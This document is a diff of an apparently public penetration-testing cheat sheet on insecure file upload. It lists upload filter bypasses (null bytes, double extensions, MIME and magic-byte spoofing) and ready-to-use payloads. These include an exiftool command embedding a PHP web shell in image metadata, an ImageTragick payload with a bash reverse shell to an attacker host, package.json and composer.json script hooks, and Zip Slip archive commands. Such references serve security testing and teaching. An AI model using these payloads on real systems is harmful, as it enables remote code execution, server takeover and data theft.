@@ -1,12 +1,28 @@
 +++
 title = "Insecure File Upload"
-date = '2022-10-16'
+date = '2023-04-06'
 description = 'All about insecure file upload techniques, methods, payloads, how/why/when they work.'
 include_toc = true
 +++
-# Insecure File Upload
+
+# Upload Insecure Files
 
 > Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.
+
+## Summary
+
+* [Tools](#tools)
+* [Exploits](#exploits)
+* [Defaults extensions](#defaults-extensions)
+* [Upload tricks](#upload-tricks)
+* [Filename vulnerabilities](#filename-vulnerabilities)
+* [Picture compression](#picture-compression-)
+* [Configuration Files](#configuration-files)
+* [CVE - ImageMagick](#cve---imagemagick)
+* [CVE - FFMpeg](#cve---ffmpeg)
+* [ZIP Archive](#zip-archive)
+* [Jetty RCE](#jetty-rce)
+* [References](#references)
 
 
 ## Tools
@@ -14,37 +30,40 @@ include_toc = true
 - [Burp > Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
 - [ZAP > FileUpload AddOn](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/)
 
+
 ## Exploits
+
+![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)
 
 ### Defaults extensions
 
 * PHP Server
-    ```powershell
-    .php
-    .php3
-    .php4
-    .php5
-    .php7
+```powershell
+.php
+.php3
+.php4
+.php5
+.php7
 
-    # Less known PHP extensions
-    .pht
-    .phps
-    .phar
-    .phpt
-    .pgif
-    .phtml
-    .phtm
-    .inc
-    ```
+# Less known PHP extensions
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.inc
+```
 * ASP Server
-    ```powershell
-    .asp
-    .aspx
-    .config
-    .cer and .asa # (IIS <= 7.5)
-    shell.aspx;1.jpg # (IIS < 7.0)
-    shell.soap
-    ```
+```powershell
+.asp
+.aspx
+.config
+.cer and .asa # (IIS <= 7.5)
+shell.aspx;1.jpg # (IIS < 7.0)
+shell.soap
+```
 * JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action`s
 * Perl: `.pl, .pm, .cgi, .lib`
 * Coldfusion: `.cfm, .cfml, .cfc, .dbm`
@@ -55,33 +74,33 @@ include_toc = true
 - Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
 - Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
 - Null byte (works well against `pathinfo()`)
-    * `.php%00.gif`
-    * `.php\x00.gif`
-    * `.php%00.png`
-    * `.php\x00.png`
-    * `.php%00.jpg`
-    * `.php\x00.jpg`
+* `.php%00.gif`
+* `.php\x00.gif`
+* `.php%00.png`
+* `.php\x00.png`
+* `.php%00.jpg`
+* `.php\x00.jpg`
 - Special characters
-    * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
-    * Whitespace and new line characters
-        * `file.php%20`
-        * `file.php%0d%0a.jpg`
-        * `file.php%0a`
-    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
-    * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
-    * Multiple special characters: `file.jsp/././././.`
+* Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
+* Whitespace and new line characters
+* `file.php%20`
+* `file.php%0d%0a.jpg`
+* `file.php%0a`
+* Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
+* Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
+* Multiple special characters: `file.jsp/././././.`
 - Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
-    * `Content-Type : image/gif`
-    * `Content-Type : image/png`
-    * `Content-Type : image/jpeg`
-    * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
-    * Set the Content-Type twice: once for unallowed type and once for allowed.
+* `Content-Type : image/gif`
+* `Content-Type : image/png`
+* `Content-Type : image/jpeg`
+* Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
+* Set the Content-Type twice: once for unallowed type and once for allowed.
 - [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
-    * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
-        * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
-        * JPG: `\xff\xd8\xff`
-        * GIF: `GIF87a` OR `GIF8;`
-    * Shell can also be added in the metadata
+* Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
+* PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
+* JPG: `\xff\xd8\xff`
+* GIF: `GIF87a` OR `GIF8;`
+* Shell can also be added in the metadata
 - Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")
 
 ### Filename vulnerabilities
@@ -104,9 +123,9 @@ Create valid pictures hosting PHP code. Upload the picture and use a **Local Fil
 
 - Picture Metadata, hide the payload inside a comment tag in the metadata.
 - Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
-    - [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
-    - [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
-    - [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php
+- [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
+- [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
+- [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php
 
 
 ### Picture with custom metadata
@@ -124,33 +143,36 @@ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __h
 If you are trying to upload files to a :
 - PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
 - ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
+- uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.
 
 Configuration files examples
 - [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
 - [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
 - [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
 - [\_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
+- [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
 
 Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
 - package.json
-    ```js
-    "scripts": {
-        "prepare" : "/bin/touch /tmp/pwned.txt"
-    }
-    ```
+```js
+"scripts": {
+    "prepare" : "/bin/touch /tmp/pwned.txt"
+}
+```
 - composer.json
-    ```js
-    "scripts": {
-        "pre-command-run" : [
-        "/bin/touch /tmp/pwned.txt"
-        ]
-    }
-    ```
+```js
+"scripts": {
+    "pre-command-run" : [
+    "/bin/touch /tmp/pwned.txt"
+    ]
+}
+```
 
-### CVE - Image Tragik
+### CVE - ImageMagick
 
-Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
 
+* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
 ```powershell
 push graphic-context
 viewbox 0 0 640 480
@@ -158,7 +180,7 @@ fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-p
 pop graphic-context
 ```
 
-More payload in the folder `Picture Image Magik`
+More payloads in the folder `Picture ImageMagick`
 
 ### CVE - FFMpeg
 
@@ -170,18 +192,21 @@ FFmpeg HLS vulnerability
 When a ZIP/archive file is automatically decompressed after the upload
 
 * Zip Slip: directory traversal to write a file somewhere else
-    ```python
-    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
+```python
+python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
 
-    ln -s ../../../index.php symindex.txt
-    zip --symlinks test.zip symindex.txt
-    ```
+ln -s ../../../index.php symindex.txt
+zip --symlinks test.zip symindex.txt
+```
 
 ### Jetty RCE
 
 Upload the XML file to `$JETTY_BASE/webapps/`
 * [JettyShell.xml - From Mikhail Klyuchnikov](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)
 
+## Labs
+
+* [Portswigger Labs on File Uploads](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
 
 ## References
 
@@ -197,3 +222,5 @@ Upload the XML file to `$JETTY_BASE/webapps/`
 * [Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
 * [A tip for getting RCE in Jetty apps with just one XML file! - Aug 4, 2022 - PT SWARM / @ptswarm](https://twitter.com/ptswarm/status/1555184661751648256/)
 * [Jetty Features for Hacking Web Apps - September 15, 2022 - Mikhail Klyuchnikov](https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/)
+* [Inyección de código en imágenes subidas y tratadas con PHP-GD  - Spanish Resource - hackplayers](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
+* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
